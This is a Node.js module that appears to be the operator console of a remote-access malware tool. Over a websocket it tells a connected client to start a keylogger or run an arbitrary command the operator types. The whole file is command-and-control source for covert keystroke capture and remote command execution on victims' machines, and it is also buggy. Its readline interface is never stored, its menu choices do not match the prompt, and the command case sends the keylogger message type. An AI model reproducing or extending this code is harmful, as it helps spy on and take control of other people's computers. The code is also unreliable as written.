"use strict"

const readline = require("readline");
const Utils = require("../Utils");

class HandleClientCommands
{
    constructor(ws)
    {
        this._ws = ws;
        this._commandInterface = this._createCommandInterface();
    }

    async menu()
    {
        // Create question options
        let strQuestion = "";
        for(let option in HandleClientCommands.menuOptions)
        {
            strQuestion += `Write  ${option} for ${HandleClientCommands.menuOptions[option]}`
        }

        // Choose what mode to operate in
        let strMode = await this._askQuestion(strQuestion);

        switch(strMode)
        {
            case "keylogger":
                this.caseKeylogger();
                break;
            case "executing command":
                this.caseCommand();
                break;
            default:
                console.log("Message not configured!");   
        }
    }

    async caseCommand()
    {
        let command = await this._askQuestion("Insert command: ");

        this._ws.send(Utils.makeMessage(
            "keylogger", {command: command}
        ));
    }

    caseKeylogger()
    {
        this._ws.send(Utils.makeMessage(
            "keylogger", {command: ""}
        ));
    }

    _askQuestion(strQuestion)
    {
        return new Promise((resolve, reject) => {
            this._commandInterface.question(strQuestion, resolve);
        });
    }

    _createCommandInterface()
    {
        this._commandInterface = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
    }

    static get menuOptions()
    {
        return {
            listen: "keylogger",
            command: "executing command"
        }
    }
}

module.exports = HandleClientCommands